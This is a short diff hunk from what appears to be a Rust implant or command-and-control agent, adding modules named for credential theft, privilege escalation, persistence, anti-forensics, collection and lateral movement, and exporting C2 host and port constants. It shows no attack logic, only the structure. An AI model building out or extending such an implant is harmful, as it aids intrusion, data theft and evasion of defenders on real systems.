@@ -10,6 +10,13 @@ mod syscall;
 mod inject;
 mod loader;
 mod fingerprint;
+mod cred;
+mod discovery;
+mod privesc;
+mod persist;
+mod antifor;
+mod collect;
+mod lateral;
 mod agent_loop;
 
 pub use agent_loop::{Session, C2_HOST, C2_PORT, BUILD_UUID};
